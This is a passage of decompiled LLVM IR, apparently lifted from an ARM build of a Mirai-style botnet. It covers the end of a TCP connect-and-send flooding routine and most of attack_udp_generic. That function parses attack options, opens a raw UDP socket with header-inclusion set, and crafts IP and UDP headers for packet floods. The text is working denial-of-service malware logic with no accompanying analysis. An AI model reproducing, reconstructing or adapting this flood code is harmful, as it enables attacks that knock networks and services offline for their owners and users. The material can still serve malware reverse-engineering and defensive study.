  %v3_b754 = call i32 @bind(i32 %v3_b718, i32 %v2_b72c, i32 16)
  %v0_b758 = load i32, i32* @r6, align 4
  %v1_b758 = add i32 %v0_b758, 20
  %v2_b758 = inttoptr i32 %v1_b758 to i8*
  %v3_b758 = load i8, i8* %v2_b758, align 1
  %v4_b758 = zext i8 %v3_b758 to i32
  store i32 %v4_b758, i32* %r3.global-to-local, align 4
  %tmp = icmp ult i8 %v3_b758, 32
  br i1 %tmp, label %dec_label_pc_b7e0, label %dec_label_pc_b764

dec_label_pc_b764:                                ; preds = %dec_label_pc_b73c, %dec_label_pc_b7e0
  %v0_b768 = phi i32 [ %v0_b758, %dec_label_pc_b73c ], [ %v0_b768.pre, %dec_label_pc_b7e0 ]
  %v1_b76c = load i32, i32* @r8, align 4
  %v2_b76c = add i32 %v1_b76c, %stack_var_-60.0
  %v3_b76c = inttoptr i32 %v2_b76c to i32*
  %v4_b76c = load i32, i32* %v3_b76c, align 4
  %v3_b774 = call i32 @__libc_connect(i32 %v4_b76c, i32 %v0_b768, i32 16)
  %v0_b77c = load i32, i32* @sb, align 4
  %v1_b77c = load i32, i32* @r7, align 4
  %v9_b77c = icmp eq i32 %v0_b77c, %v1_b77c
  %v1_b780 = add i32 %stack_var_-60.0, 4
  store i32 %v1_b780, i32* %r3.global-to-local, align 4
  br i1 %v9_b77c, label %dec_label_pc_b834, label %dec_label_pc_b78c

dec_label_pc_b78c:                                ; preds = %dec_label_pc_b764, %dec_label_pc_b6fc
  %stack_var_-60.0 = phi i32 [ 0, %dec_label_pc_b6fc ], [ %v1_b780, %dec_label_pc_b764 ]
  store i32 65535, i32* @r4, align 4
  %v2_b79c = call i32 @calloc(i32 65535, i32 1)
  store i32 %v5_b7ac, i32* %r3.global-to-local, align 4
  %v1_b7b8 = load i32, i32* @r4, align 4
  %v9_b7b8 = icmp eq i32 %v3_b65c, %v1_b7b8
  %v1_b7bc = load i32, i32* @fp, align 4
  %v2_b7bc = add i32 %v1_b7bc, %arg2
  store i32 %v2_b7bc, i32* @r6, align 4
  %v2_b7c0 = load i32, i32* @sl, align 4
  %v3_b7c0 = add i32 %v2_b7c0, %stack_var_-60.0
  %v4_b7c0 = inttoptr i32 %v3_b7c0 to i32*
  store i32 %v2_b79c, i32* %v4_b7c0, align 4
  br i1 %v9_b7b8, label %dec_label_pc_b7cc, label %bb51

bb51:                                             ; preds = %dec_label_pc_b78c
  %v1_b7c4 = load i32, i32* %r3.global-to-local, align 4
  %v2_b7c4 = trunc i32 %v1_b7c4 to i16
  %v3_b7c4 = load i32, i32* @r6, align 4
  %v4_b7c4 = add i32 %v3_b7c4, 2
  %v5_b7c4 = inttoptr i32 %v4_b7c4 to i16*
  store i16 %v2_b7c4, i16* %v5_b7c4, align 2
  br label %dec_label_pc_b70c

dec_label_pc_b7cc:                                ; preds = %dec_label_pc_b78c
  %v0_b7cc = call i32 @rand_next()
  %v1_b7cc = trunc i32 %v0_b7cc to i16
  %v0_b7d4 = load i32, i32* @fp, align 4
  %v2_b7d4 = add i32 %v0_b7d4, %arg2
  store i32 %v2_b7d4, i32* @r6, align 4
  %v4_b7d8 = add i32 %v2_b7d4, 2
  %v5_b7d8 = inttoptr i32 %v4_b7d8 to i16*
  store i16 %v1_b7cc, i16* %v5_b7d8, align 2
  br label %dec_label_pc_b70c

dec_label_pc_b7e0:                                ; preds = %dec_label_pc_b73c
  %v1_b7e0 = add i32 %v0_b758, 16
  %v2_b7e0 = inttoptr i32 %v1_b7e0 to i32*
  %v3_b7e0 = load i32, i32* %v2_b7e0, align 4
  store i32 %v3_b7e0, i32* @r4, align 4
  %v0_b7e4 = call i32 @rand_next()
  %v0_b7e8 = load i32, i32* @r4, align 4
  %v1_b7f4 = and i32 %v0_b7e8, 65280
  store i32 %v1_b7f4, i32* %r3.global-to-local, align 4
  %v0_b7fc = load i32, i32* @r6, align 4
  %v1_b7fc = add i32 %v0_b7fc, 20
  %v2_b7fc = inttoptr i32 %v1_b7fc to i8*
  %v3_b7fc = load i8, i8* %v2_b7fc, align 1
  %v4_b7fc = zext i8 %v3_b7fc to i32
  %v5_b800 = call i32 @llvm.bswap.i32(i32 %v0_b7e8)
  %v7_b804 = lshr i32 %v0_b7e4, %v4_b7fc
  %v8_b804 = add i32 %v7_b804, %v5_b800
  %v5_b81c = call i32 @llvm.bswap.i32(i32 %v8_b804)
  store i32 %v5_b81c, i32* %r3.global-to-local, align 4
  %v2_b820 = add i32 %v0_b7fc, 4
  %v3_b820 = inttoptr i32 %v2_b820 to i32*
  store i32 %v5_b81c, i32* %v3_b820, align 4
  %v0_b768.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_b764

dec_label_pc_b828:                                ; preds = %dec_label_pc_b70c
  store i32 %v18_b608, i32* %sb.global-to-local, align 4
  ret i32 %v3_b718

dec_label_pc_b834:                                ; preds = %dec_label_pc_b764, %dec_label_pc_b6f4
  %v1_b87422 = phi i32 [ 0, %dec_label_pc_b6f4 ], [ %v0_b77c, %dec_label_pc_b764 ]
  %v2_b838 = icmp eq i32 %v0_b6d810, 0
  br i1 %v2_b838, label %dec_label_pc_b858.outer, label %dec_label_pc_b870

dec_label_pc_b848:                                ; preds = %dec_label_pc_b858
  store i32 %v1_b84c, i32* @r4, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_b848 = load i32, i32* @r8, align 4
  %v4_b848 = mul i32 %v1_b84c, 4
  %v5_b848 = add i32 %v0_b848, %v4_b848
  %v6_b848 = inttoptr i32 %v5_b848 to i32*
  %v7_b848 = load i32, i32* %v6_b848, align 4
  %v0_b84c = load i32, i32* @sl, align 4
  %v5_b84c = add i32 %v0_b84c, %v4_b848
  %v6_b84c = inttoptr i32 %v5_b84c to i32*
  %v7_b84c = load i32, i32* %v6_b84c, align 4
  %v4_b850 = call i32 @__libc_send(i32 %v7_b848, i32 %v7_b84c, i32 %v0_b85c, i32 16384)
  %v0_b854 = load i32, i32* @r4, align 4
  %v1_b854 = add i32 %v0_b854, 1
  %v0_b858.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_b858.outer

dec_label_pc_b858.outer:                          ; preds = %dec_label_pc_b834, %dec_label_pc_b848
  %v0_b858.ph = phi i32 [ %v0_b858.pre.pre, %dec_label_pc_b848 ], [ %v1_b87422, %dec_label_pc_b834 ]
  %v1_b84c.ph = phi i32 [ %v1_b854, %dec_label_pc_b848 ], [ 0, %dec_label_pc_b834 ]
  %v0_b85c = load i32, i32* @r5, align 4
  br label %dec_label_pc_b858

dec_label_pc_b858:                                ; preds = %dec_label_pc_b858.outer, %dec_label_pc_b858
  %v1_b84c = phi i32 [ 0, %dec_label_pc_b858 ], [ %v1_b84c.ph, %dec_label_pc_b858.outer ]
  %v8_b864 = icmp sgt i32 %v0_b858.ph, %v1_b84c
  br i1 %v8_b864, label %dec_label_pc_b848, label %dec_label_pc_b858

dec_label_pc_b870:                                ; preds = %dec_label_pc_b874, %dec_label_pc_b834
  %v1_b87421 = phi i32 [ %v1_b87422, %dec_label_pc_b834 ], [ %v1_b874, %dec_label_pc_b874 ]
  br label %dec_label_pc_b874

dec_label_pc_b874:                                ; preds = %dec_label_pc_b880, %dec_label_pc_b870
  %v1_b874 = phi i32 [ %v1_b87421, %dec_label_pc_b870 ], [ %v1_b874.pre, %dec_label_pc_b880 ]
  %v1_b880 = phi i32 [ 0, %dec_label_pc_b870 ], [ %v1_b8a0, %dec_label_pc_b880 ]
  store i32 %v1_b880, i32* @r6, align 4
  %v6_b87c = icmp slt i32 %v1_b880, %v1_b874
  br i1 %v6_b87c, label %dec_label_pc_b880, label %dec_label_pc_b870

dec_label_pc_b880:                                ; preds = %dec_label_pc_b874
  %v0_b878 = load i32, i32* @r5, align 4
  %v0_b880 = load i32, i32* @sl, align 4
  %v4_b880 = mul i32 %v1_b880, 4
  %v5_b880 = add i32 %v0_b880, %v4_b880
  %v6_b880 = inttoptr i32 %v5_b880 to i32*
  %v7_b880 = load i32, i32* %v6_b880, align 4
  store i32 %v7_b880, i32* @r4, align 4
  %v2_b888 = inttoptr i32 %v7_b880 to i16*
  %v3_b888 = call i32 @rand_str(i16* %v2_b888, i32 %v0_b878)
  %v0_b88c = load i32, i32* @r8, align 4
  %v1_b88c = load i32, i32* @r6, align 4
  %v4_b88c = mul i32 %v1_b88c, 4
  %v5_b88c = add i32 %v4_b88c, %v0_b88c
  %v6_b88c = inttoptr i32 %v5_b88c to i32*
  %v7_b88c = load i32, i32* %v6_b88c, align 4
  %v0_b890 = load i32, i32* @r4, align 4
  %v0_b894 = load i32, i32* @r5, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_b89c = call i32 @__libc_send(i32 %v7_b88c, i32 %v0_b890, i32 %v0_b894, i32 16384)
  %v0_b8a0 = load i32, i32* @r6, align 4
  %v1_b8a0 = add i32 %v0_b8a0, 1
  %v1_b874.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_b874

; uselistorder directives
  uselistorder i32 %v1_b874, { 1, 0 }
  uselistorder i32 %v1_b84c, { 2, 1, 0 }
  uselistorder i32 %v5_b81c, { 1, 0 }
  uselistorder i32 %stack_var_-60.0, { 0, 2, 1, 3 }
  uselistorder i32 %v0_b758, { 1, 0, 2 }
  uselistorder i32 %v3_b718, { 1, 2, 3, 0 }
  uselistorder i32 %v3_b6ac, { 1, 0 }
  uselistorder i32 %v3_b65c, { 2, 0, 1 }
  uselistorder i32* %stack_var_-56, { 1, 3, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 2, 1, 3, 4, 8, 9, 5, 6, 7, 10, 11, 12, 13, 14, 15, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_b858, { 1, 0 }
  uselistorder label %dec_label_pc_b858.outer, { 1, 0 }
  uselistorder label %dec_label_pc_b764, { 1, 0 }
  uselistorder label %dec_label_pc_b70c, { 1, 0 }
  uselistorder label %dec_label_pc_b6f4, { 1, 0 }
}

define i32 @attack_udp_generic(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %v18_b8a8 = load i32, i32* @sb, align 4
  %v27_b8a8 = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @r8, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r7, align 4
  %v2_b8c4 = call i32 @calloc(i32 %arg1, i32 4)
  %v0_b8c8 = load i32, i32* @r5, align 4
  store i32 %v0_b8c8, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b8d8 = load i32, i32* @r4, align 4
  store i32 %v0_b8d8, i32* %r0.global-to-local, align 4
  %v5_b8dc = inttoptr i32 %v0_b8c8 to i32*
  %v6_b8dc = call i32 @attack_get_opt_int(i32 %v0_b8d8, i32* %v5_b8dc, i32 2, i32 0, i32 %v2_b8c4)
  %v1_b8e8 = urem i32 %v6_b8dc, 256
  store i32 %v1_b8e8, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_b8f4 = load i32, i32* @r5, align 4
  store i32 %v0_b8f4, i32* %r1.global-to-local, align 4
  %v0_b8f8 = load i32, i32* @r4, align 4
  store i32 %v0_b8f8, i32* %r0.global-to-local, align 4
  %v5_b8fc = trunc i32 %v6_b8dc to i8
  %v6_b900 = inttoptr i32 %v0_b8f4 to i32*
  %v7_b900 = call i32 @attack_get_opt_int(i32 %v0_b8f8, i32* %v6_b900, i32 3, i32 65535, i32 %v6_b8dc)
  %v0_b904 = load i32, i32* @r5, align 4
  store i32 %v0_b904, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_b914 = load i32, i32* @r4, align 4
  store i32 %v0_b914, i32* %r0.global-to-local, align 4
  %v5_b918 = inttoptr i32 %v0_b904 to i32*
  %v6_b918 = call i32 @attack_get_opt_int(i32 %v0_b914, i32* %v5_b918, i32 4, i32 64, i32 %v7_b900)
  %v1_b920 = urem i32 %v6_b918, 256
  store i32 %v1_b920, i32* %ip.global-to-local, align 4
  %v0_b924 = load i32, i32* @r5, align 4
  store i32 %v0_b924, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b930 = load i32, i32* @r4, align 4
  store i32 %v0_b930, i32* %r0.global-to-local, align 4
  %v6_b938 = inttoptr i32 %v0_b924 to i32*
  %v7_b938 = call i32 @attack_get_opt_int(i32 %v0_b930, i32* %v6_b938, i32 5, i32 0, i32 %v1_b920)
  %v1_b944 = urem i32 %v7_b938, 256
  store i32 %v1_b944, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_b950 = load i32, i32* @r5, align 4
  store i32 %v0_b950, i32* %r1.global-to-local, align 4
  %v0_b954 = load i32, i32* @r4, align 4
  store i32 %v0_b954, i32* %r0.global-to-local, align 4
  %v5_b95c = inttoptr i32 %v0_b950 to i32*
  %v6_b95c = call i32 @attack_get_opt_int(i32 %v0_b954, i32* %v5_b95c, i32 6, i32 65535, i32 %v1_b944)
  %v0_b964 = load i32, i32* @r5, align 4
  store i32 %v0_b964, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_b95c, i32* %sb.global-to-local, align 4
  %v0_b974 = load i32, i32* @r4, align 4
  store i32 %v0_b974, i32* %r0.global-to-local, align 4
  %v5_b978 = inttoptr i32 %v0_b964 to i32*
  %v6_b978 = call i32 @attack_get_opt_int(i32 %v0_b974, i32* %v5_b978, i32 7, i32 65535, i32 ptrtoint (i32* @0 to i32))
  %v0_b97c = load i32, i32* @r5, align 4
  store i32 %v0_b97c, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  store i32 %v6_b978, i32* @sl, align 4
  %v0_b98c = load i32, i32* @r4, align 4
  store i32 %v0_b98c, i32* %r0.global-to-local, align 4
  %v5_b990 = inttoptr i32 %v0_b97c to i32*
  %v6_b990 = call i32 @attack_get_opt_int(i32 %v0_b98c, i32* %v5_b990, i32 0, i32 512, i32 ptrtoint (i32* @0 to i32))
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_b99c = load i32, i32* @r5, align 4
  store i32 %v0_b99c, i32* %r1.global-to-local, align 4
  store i32 %v6_b990, i32* @r6, align 4
  %v0_b9a4 = load i32, i32* @r4, align 4
  store i32 %v0_b9a4, i32* %r0.global-to-local, align 4
  %v5_b9a8 = inttoptr i32 %v0_b99c to i32*
  %v6_b9a8 = call i32 @attack_get_opt_int(i32 %v0_b9a4, i32* %v5_b9a8, i32 1, i32 1, i32 ptrtoint (i32* @0 to i32))
  %v2_b9b4 = load i32, i32* @global_var_2472c.58, align 4
  store i32 %v2_b9b4, i32* %r3.global-to-local, align 4
  %v1_b9b8 = urem i32 %v6_b9a8, 256
  store i32 %v1_b9b8, i32* %ip.global-to-local, align 4
  %v0_b9bc = load i32, i32* @r5, align 4
  store i32 %v0_b9bc, i32* %r1.global-to-local, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_b9c4 = load i32, i32* @r4, align 4
  store i32 %v0_b9c4, i32* %r0.global-to-local, align 4
  %v5_b9cc = inttoptr i32 %v0_b9bc to i32*
  %v6_b9cc = call i32 @attack_get_opt_int(i32 %v0_b9c4, i32* %v5_b9cc, i32 25, i32 %v2_b9b4, i32 %v1_b9b8)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_b9e0 = call i32 @socket(i32 2, i32 3, i32 17)
  store i32 %v3_b9e0, i32* %r0.global-to-local, align 4
  %v7_b9e4 = icmp eq i32 %v3_b9e0, -1
  store i1 %v7_b9e4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_b9e0, i32* @fp, align 4
  br i1 %v7_b9e4, label %dec_label_pc_bd84, label %dec_label_pc_b9f0

dec_label_pc_b9f0:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_b9f8 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_b9f8, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_ba0c = call i32 @__GI_setsockopt(i32 %v3_b9e0, i32 0, i32 3, i32 %v6_b9f8, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_ba0c, i32* %r0.global-to-local, align 4
  %v7_ba10 = icmp eq i32 %v5_ba0c, -1
  store i1 %v7_ba10, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ba10, label %dec_label_pc_bd7c, label %dec_label_pc_ba18

dec_label_pc_ba18:                                ; preds = %dec_label_pc_b9f0
  %v0_ba18 = load i32, i32* @r6, align 4
  store i32 1460, i32* %r3.global-to-local, align 4
  %v3_ba24 = urem i32 %v0_ba18, 65536
  store i32 %v3_ba24, i32* %r2.global-to-local, align 4
  %v3_ba28 = icmp ugt i32 %v3_ba24, 1459
  %v9_ba28 = icmp eq i32 %v3_ba24, 1460
  store i1 %v9_ba28, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_ba28, label %bb, label %bb48

bb:                                               ; preds = %dec_label_pc_ba18
  store i32 1460, i32* %r2.global-to-local, align 4
  br label %bb48

bb48:                                             ; preds = %dec_label_pc_ba18, %bb
  %v0_ba84 = phi i32 [ %v3_ba24, %dec_label_pc_ba18 ], [ 1460, %bb ]
  store i32 %v7_b900, i32* %r0.global-to-local, align 4
  %v0_ba34 = load i32, i32* %sb.global-to-local, align 4
  %v3_ba3c = urem i32 %v0_ba34, 65536
  store i32 %v3_ba3c, i32* %ip.global-to-local, align 4
  %v0_ba40 = load i32, i32* @r7, align 4
  %v2_ba40 = icmp eq i32 %v0_ba40, 0
  store i1 %v2_ba40, i1* %cpsr_z.global-to-local, align 1
  %v0_ba44 = load i32, i32* @sl, align 4
  %v3_ba44 = mul i32 %v0_ba44, 65536
  br i1 %v2_ba40, label %bb49, label %bb50

bb49:                                             ; preds = %bb48
  store i32 %v0_ba84, i32* %ip.global-to-local, align 4
  br label %bb50

bb50:                                             ; preds = %bb48, %bb49
  %v1_ba74 = phi i32 [ %v3_ba3c, %bb48 ], [ %v0_ba84, %bb49 ]
  %v3_ba54 = urem i32 %v0_ba44, 65536
  store i32 %v3_ba54, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_ba5c = urem i32 %v7_b900, 65536
  store i32 %v3_ba5c, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_ba40, label %.thread, label %dec_label_pc_ba7c

.thread:                                          ; preds = %bb50
  %v2_ba70 = add nsw i32 %v1_ba74, 28
  store i32 %v2_ba70, i32* @sb, align 4
  %v2_ba74 = add nsw i32 %v1_ba74, 8
  store i32 %v2_ba74, i32* @sl, align 4
  br label %dec_label_pc_bba0.preheader

dec_label_pc_ba7c:                                ; preds = %bb50
  %v1_ba84 = add nuw nsw i32 %v0_ba84, 28
  store i32 %v1_ba84, i32* @sb, align 4
  %v1_ba88 = add nuw nsw i32 %v0_ba84, 8
  store i32 %v1_ba88, i32* @sl, align 4
  %tmp51 = mul i32 %v0_ba34, 256
  %v3_ba9c = and i32 %tmp51, 65280
  %tmp52 = udiv i32 %v0_ba34, 256
  %v4_baac = urem i32 %tmp52, 256
  %v5_baac = or i32 %v4_baac, %v3_ba9c
  store i32 %v5_baac, i32* @r6, align 4
  store i32 %v3_ba44, i32* %r1.global-to-local, align 4
  %tmp53 = mul nuw nsw i32 %v1_ba84, 256
  %v3_bab8 = and i32 %tmp53, 65280
  store i32 %v3_bab8, i32* %r3.global-to-local, align 4
  %tmp54 = mul i32 %v0_ba44, 256
  %v3_babc = and i32 %tmp54, 65280
  %tmp55 = mul nuw nsw i32 %v1_ba88, 256
  %v3_bac0 = and i32 %tmp55, 65280
  store i32 %v3_bac0, i32* %ip.global-to-local, align 4
  %tmp56 = udiv i32 %v1_ba84, 256
  %v4_bac4 = urem i32 %tmp56, 256
  %v5_bac4 = or i32 %v4_bac4, %v3_bab8
  store i32 %v5_bac4, i32* @lr, align 4
  %tmp57 = udiv i32 %v0_ba44, 256
  %v4_bac8 = urem i32 %tmp57, 256
  %v5_bac8 = or i32 %v4_bac8, %v3_babc
  store i32 %v5_bac8, i32* %r0.global-to-local, align 4
  %trunc = trunc i32 %v1_ba88 to i16
  %rev = call i16 @llvm.bswap.i16(i16 %trunc)
  %tmp58 = mul i32 %v7_b900, 256
  %v3_bad0 = and i32 %tmp58, 65280
  store i32 %v3_bad0, i32* %r2.global-to-local, align 4
  %tmp59 = udiv i32 %v7_b900, 256
  %v4_bae0 = urem i32 %tmp59, 256
  %v5_bae0 = or i32 %v4_bae0, %v3_bad0
  store i32 %v5_bae0, i32* @r5, align 4
  store i32 0, i32* @r4, align 4
  %sext = mul nuw i32 %v5_bac4, 65536
  %v4_bb54 = sdiv i32 %sext, 65536
  %sext6 = mul nuw i32 %v5_bac8, 65536
  %v7_bb88 = sdiv i32 %sext6, 65536
  %v1_bb48 = trunc i32 %v6_b918 to i8
  %v3_bb88 = sext i16 %rev to i32
  br label %dec_label_pc_bae8

dec_label_pc_bae8:                                ; preds = %.thread8, %dec_label_pc_ba7c
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 1510, i32* %r0.global-to-local, align 4
  %v2_baf4 = call i32 @calloc(i32 1510, i32 1)
  store i32 %v2_baf4, i32* %r0.global-to-local, align 4
  store i32 %v2_b8c4, i32* %r3.global-to-local, align 4
  %v3_bafc = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_bafc, i32* %r1.global-to-local, align 4
  %v2_bb00 = load i32, i32* @r4, align 4
  %v5_bb00 = mul i32 %v2_bb00, 4
  %v6_bb00 = add i32 %v5_bb00, %v2_b8c4
  %v7_bb00 = inttoptr i32 %v6_bb00 to i32*
  store i32 %v2_baf4, i32* %v7_bb00, align 4
  %v0_bb04 = load i32, i32* %r3.global-to-local, align 4
  %v1_bb04 = load i32, i32* %r1.global-to-local, align 4
  %v4_bb04 = mul i32 %v1_bb04, 4
  %v5_bb04 = add i32 %v4_bb04, %v0_bb04
  %v6_bb04 = inttoptr i32 %v5_bb04 to i32*
  %v7_bb04 = load i32, i32* %v6_bb04, align 4
  store i32 %v7_bb04, i32* %r0.global-to-local, align 4
  %v1_bb08 = inttoptr i32 %v7_bb04 to i8*
  %v2_bb08 = load i8, i8* %v1_bb08, align 1
  %tmp = urem i8 %v2_bb08, 16
  %v1_bb0c = zext i8 %tmp to i32
  %v1_bb10 = or i32 %v1_bb0c, 64
  store i32 %v1_bb10, i32* %r3.global-to-local, align 4
  %v1_bb14 = trunc i32 %v1_bb10 to i8
  store i8 %v1_bb14, i8* %v1_bb08, align 1
  %v0_bb18 = load i32, i32* %r0.global-to-local, align 4
  %v1_bb18 = inttoptr i32 %v0_bb18 to i8*
  %v2_bb18 = load i8, i8* %v1_bb18, align 1
  %v1_bb1c = and i8 %v2_bb18, -16
  %v1_bb20 = or i8 %v1_bb1c, 5
  store i32 %v1_b944, i32* %ip.global-to-local, align 4
  %v0_bb28 = load i32, i32* %r1.global-to-local, align 4
  %v3_bb28 = mul i32 %v0_bb28, 32
  store i32 %v3_bb28, i32* %r2.global-to-local, align 4
  store i8 %v1_bb20, i8* %v1_bb18, align 1
  %v0_bb30 = load i32, i32* %r1.global-to-local, align 4
  %v1_bb30 = add i32 %v0_bb30, 1
  store i32 %v1_bb30, i32* @r4, align 4
  %v0_bb34 = load i32, i32* %r2.global-to-local, align 4
  %tmp61 = mul i32 %v0_bb30, -8
  %v5_bb34 = add i32 %v0_bb34, %tmp61
  store i32 %v5_bb34, i32* %r2.global-to-local, align 4
  store i32 %v6_b8dc, i32* %r1.global-to-local, align 4
  %v2_bb3c = load i32, i32* %r0.global-to-local, align 4
  %v3_bb3c = add i32 %v2_bb3c, 1
  %v4_bb3c = inttoptr i32 %v3_bb3c to i8*
  store i8 %v5_b8fc, i8* %v4_bb3c, align 1
  store i32 %v1_b920, i32* %r3.global-to-local, align 4
  %v0_bb44 = load i32, i32* %ip.global-to-local, align 4
  %v2_bb44 = icmp eq i32 %v0_bb44, 0
  store i1 %v2_bb44, i1* %cpsr_z.global-to-local, align 1
  %v2_bb48 = load i32, i32* %r0.global-to-local, align 4
  %v3_bb48 = add i32 %v2_bb48, 8
  %v4_bb48 = inttoptr i32 %v3_bb48 to i8*
  store i8 %v1_bb48, i8* %v4_bb48, align 1
  %v0_bb4c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_bb4c, label %.thread8, label %bb60

bb60:                                             ; preds = %dec_label_pc_bae8
  store i32 64, i32* %r3.global-to-local, align 4
  %v3_bb50 = load i32, i32* %r0.global-to-local, align 4
  %v4_bb50 = add i32 %v3_bb50, 6
  %v5_bb50 = inttoptr i32 %v4_bb50 to i16*
  store i16 64, i16* %v5_bb50, align 2
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_bae8, %bb60
  store i32 %v4_bb54, i32* %ip.global-to-local, align 4
  store i32 17, i32* %r3.global-to-local, align 4
  %v2_bb5c = load i32, i32* %r0.global-to-local, align 4
  %v3_bb5c = add i32 %v2_bb5c, 9
  %v4_bb5c = inttoptr i32 %v3_bb5c to i8*
  store i8 17, i8* %v4_bb5c, align 1
  %v0_bb60 = load i32, i32* %ip.global-to-local, align 4
  %v1_bb60 = trunc i32 %v0_bb60 to i16
  %v2_bb60 = load i32, i32* %r0.global-to-local, align 4
  %v3_bb60 = add i32 %v2_bb60, 2
  %v4_bb60 = inttoptr i32 %v3_bb60 to i16*
  store i16 %v1_bb60, i16* %v4_bb60, align 2
  store i32 %v6_b9cc, i32* %ip.global-to-local, align 4
  %v1_bb68 = load i32, i32* %r0.global-to-local, align 4
  %v2_bb68 = add i32 %v1_bb68, 12
  %v3_bb68 = inttoptr i32 %v2_bb68 to i32*
  store i32 %v6_b9cc, i32* %v3_bb68, align 4
  %v0_bb6c = load i32, i32* %r2.global-to-local, align 4
  %v1_bb6c = load i32, i32* @r8, align 4
  %v2_bb6c = add i32 %v1_bb6c, %v0_bb6c
  store i32 %v2_bb6c, i32* %r2.global-to-local, align 4
  %v1_bb70 = add i32 %v2_bb6c, 16
  %v2_bb70 = inttoptr i32 %v1_bb70 to i32*
  %v3_bb70 = load i32, i32* %v2_bb70, align 4
  store i32 %v3_bb70, i32* %r3.global-to-local, align 4
  %v0_bb74 = load i32, i32* @r5, align 4
  %v1_bb74 = trunc i32 %v0_bb74 to i16
  %v2_bb74 = load i32, i32* %r0.global-to-local, align 4
  %v3_bb74 = add i32 %v2_bb74, 4
  %v4_bb74 = inttoptr i32 %v3_bb74 to i16*
  store i16 %v1_bb74, i16* %v4_bb74, align 2
  %v0_bb78 = load i32, i32* %r0.global-to-local, align 4
  %v1_bb78 = add i32 %v0_bb78, 20
  store i32 %v1_bb78, i32* %r1.global-to-local, align 4
  %v0_bb7c = load i32, i32* %r3.global-to-local, align 4
  %v2_bb7c = add i32 %v0_bb78, 16
  %v3_bb7c = inttoptr i32 %v2_bb7c to i32*
  store i32 %v0_bb7c, i32* %v3_bb7c, align 4
  %v0_bb80 = load i32, i32* @r6, align 4
  %v1_bb80 = trunc i32 %v0_bb80 to i16
  %v2_bb80 = load i32, i32* %r0.global-to-local, align 4
  %v3_bb80 = add i32 %v2_bb80, 20
  %v4_bb80 = inttoptr i32 %v3_bb80 to i16*
  store i16 %v1_bb80, i16* %v4_bb80, align 2
  store i32 %v3_bb88, i32* %r0.global-to-local, align 4
  store i32 %v7_bb88, i32* %r3.global-to-local, align 4
  %v0_bb8c = load i32, i32* @r4, align 4
  %v1_bb8c = load i32, i32* @r7, align 4
  %v9_bb8c = icmp eq i32 %v0_bb8c, %v1_bb8c
  store i1 %v9_bb8c, i1* %cpsr_z.global-to-local, align 1
  %v2_bb90 = load i32, i32* %r1.global-to-local, align 4
  %v3_bb90 = add i32 %v2_bb90, 4
  %v4_bb90 = inttoptr i32 %v3_bb90 to i16*
  store i16 %rev, i16* %v4_bb90, align 2
  %v0_bb94 = load i32, i32* %r3.global-to-local, align 4
  %v1_bb94 = trunc i32 %v0_bb94 to i16
  %v2_bb94 = load i32, i32* %r1.global-to-local, align 4
  %v3_bb94 = add i32 %v2_bb94, 2
  %v4_bb94 = inttoptr i32 %v3_bb94 to i16*
  store i16 %v1_bb94, i16* %v4_bb94, align 2
  %v0_bb98 = load i32, i32* @r4, align 4
  store i32 %v0_bb98, i32* %stack_var_-44, align 4
